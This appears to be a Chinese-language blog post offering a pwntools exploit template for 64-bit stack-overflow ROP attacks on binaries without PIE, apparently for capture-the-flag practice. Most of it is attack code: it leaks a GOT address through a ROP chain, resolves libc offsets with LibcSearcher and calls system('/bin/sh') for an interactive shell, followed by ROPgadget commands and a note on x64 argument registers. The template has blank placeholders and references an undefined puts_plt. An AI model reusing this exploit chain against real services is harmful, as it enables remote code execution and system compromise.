---
title: "64位栈溢出rop模板(无PIE)"
date: 2021-07-12T17:35:19+08:00
draft: false
---

# 		64位栈溢出rop模板（无PIE）

## exp模板

```python
#!usr/bin/env python
#coding=utf-8
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
#p = process("./")
p = remote("",)
elf = ELF("./")

read_got = elf.got['read']
printf_plt = elf.plt['printf']
main_addr = elf.sym['main']
pop_rdi = 
#pop_rsi = 
#s_addr = 
#************泄露got*********
payload = b'a'*() + p64(pop_rdi) + p64(read_got)
payload+= p64(puts_plt) + p64(main_addr) #puts-read
#payload = b'a'*() + p64(pop_rdi) + p64(s_addr) + p64(pop_rsi) + p64(read_got)
#payload+= p64(0) + p64(printf_plt) + p64(main_addr) --printf-read
p.sendline( payload)
p.recvuntil('')
read_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
log.info("read_addr => %#x", read_addr)
#*****************************
#***********搜索libc，寻址*******
libc = LibcSearcher("read",read_addr)
offset = read_addr - libc.dump("read")
sys_addr = offset + libc.dump("system")
bin_sh_addr = offset + libc.dump("str_bin_sh")
#***************************
#************get shell************
payload1 = b'a'*() + p64(pop_rdi) + p64(bin_sh_addr) 
payload1+= p64(sys_addr) 

p.sendline(payload1)

p.interactive()

```

## ROPgadget

ROPgadget --binary rop  --only 'pop|ret' | grep 'eax'
查找可存储寄存器的代码

 ROPgadget --binary rop --string "/bin/sh"
查找字符串

ROPgadget --binary rop  --only 'int'
查找有int 0x80的地址

## 64位传参

对于x64体系结构，如果函数参数不大于6个时，使用寄存器传参，对于函数参数大于6个的函数，前六个参数使用寄存器传递，后面的使用栈传递。参数传递的规律是固定的，即前6个参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9，后面的依次从 “右向左” 放入栈中。